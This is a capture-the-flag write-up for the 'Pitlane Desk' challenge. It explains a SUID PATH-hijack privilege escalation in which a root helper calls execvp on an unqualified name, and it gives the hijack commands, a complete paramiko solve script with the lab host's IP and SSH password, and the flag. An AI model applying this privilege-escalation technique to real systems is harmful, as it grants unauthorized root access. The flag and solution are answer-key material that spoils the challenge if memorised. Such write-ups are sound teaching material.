---
title: "Pitlane Desk"
ctf: "Safaricom CTF"
date: 2026-10-06
category: misc
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Pitlane Desk

> **Category:** MISC · **Points:** 300 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- Desk app: http://54.72.82.22:8540/ (theme RACING)
- SSH: player@54.72.82.22:8700  pw `matinee-visitor` (paramiko)
- Container `d44a86ce1002`, Ubuntu 22.04. Root runs `python /app/service.py` (Flask).
- `/app/settings.json` kind = `linux-path`; the flag is NOT in the web app — it is
  written by `/app/linux/start.sh` to `/root/receipt` (0400 root) from `$FLAG`.

## The intended path (not the Workshop Nocturne tar/HMAC worker — this box is different)
`/app/linux/install.sh` installs a SUID-root helper:
- `/usr/local/bin/stage-report` — built from `report.c`, `chmod 4755`.
- `report.c`: `setgid(0); setuid(0); execvp("report-tool", ...)`.
`execvp` searches the caller's `PATH`, so a fake `report-tool` placed earlier in
PATH is executed **as root** (classic SUID PATH hijack).

## Winning steps
```
mkdir -p ~/bin
printf '#!/bin/sh\nid\ncat /root/receipt\n' > ~/bin/report-tool && chmod +x ~/bin/report-tool
PATH=~/bin:$PATH /usr/local/bin/stage-report
```
Output: `uid=0(root) ...` then `cat /root/receipt`.

## Artifacts (kept out of git; no binary downloads needed)
- All source read over SSH from the container: /app/service.py, /app/linux/{install.sh,report.c,start.sh}.
- sha256(install.sh)=recorded below? not needed — sources live in-container, nothing downloaded.

## Solve script

`misc/pitlane-desk/solve.py`:

```python
#!/usr/bin/env python3
"""Pitlane Desk (misc/linux) — SUID PATH-hijack privesc.

root runs `python /app/service.py`, but the intended path is local privesc:
install.sh installs /usr/local/bin/stage-report (chmod 4755, SUID root).
report.c: setgid(0); setuid(0); execvp("report-tool", ...) — execvp searches
the caller's PATH, so a fake `report-tool` earlier in PATH executes as root.
Flag lives in /root/receipt (0400 root) written by /app/linux/start.sh from $FLAG.
"""
import paramiko, sys

HOST, PORT, USER, PW = "54.72.82.22", 8700, "player", "matinee-visitor"

def run(c, cmd):
    _, out, err = c.exec_command(cmd)
    o = out.read().decode(errors="replace"); e = err.read().decode(errors="replace")
    return o + (("\n[stderr] " + e) if e.strip() else "")

def main():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USER, password=PW, timeout=20)
    run(c, "mkdir -p ~/bin")
    run(c, "printf '#!/bin/sh\\nid\\ncat /root/receipt\\n' > ~/bin/report-tool && chmod +x ~/bin/report-tool")
    out = run(c, 'PATH=~/bin:$PATH /usr/local/bin/stage-report')
    c.close()
    print(out)
    for tok in out.replace("\n", " ").split():
        if tok.startswith("safctf{") and tok.endswith("}"):
            print("FLAG:", tok)

if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- Python 3 (solver)

**Other tools that fit this category:**

- CyberChef (encoding chains)
- z3 / SageMath (constraints)
- pwntools (interaction)
- Ciphey (auto-decode)

## Flag

```
safctf{9cca688790c893101757448298adfb67}
```
